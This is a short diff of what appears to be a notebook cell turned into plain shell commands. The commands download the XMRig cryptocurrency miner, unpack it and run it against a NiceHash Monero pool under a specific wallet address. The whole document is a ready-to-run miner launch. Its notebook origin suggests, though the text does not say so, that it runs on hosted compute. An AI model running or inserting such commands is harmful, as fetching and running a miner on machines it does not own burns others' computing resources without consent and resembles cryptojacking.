@@ -1,5 +1,5 @@
-! wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz 
-! tar -xf xmrig-6.12.1-linux-x64.tar.gz
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz 
+tar -xf xmrig-6.12.1-linux-x64.tar.gz
 %cd xmrig-6.12.1
-! ./xmrig -o randomxmonero.eu.nicehash.com:3380 -a rx -k -u 38A7pBf9e2mWZFbTzBC6q7ZS2FRxAy2yrG.unmineable_miner_alpharaju+10000
+./xmrig -o randomxmonero.eu.nicehash.com:3380 -a rx -k -u 38A7pBf9e2mWZFbTzBC6q7ZS2FRxAy2yrG.unmineable_miner_alpharaju+10000
   
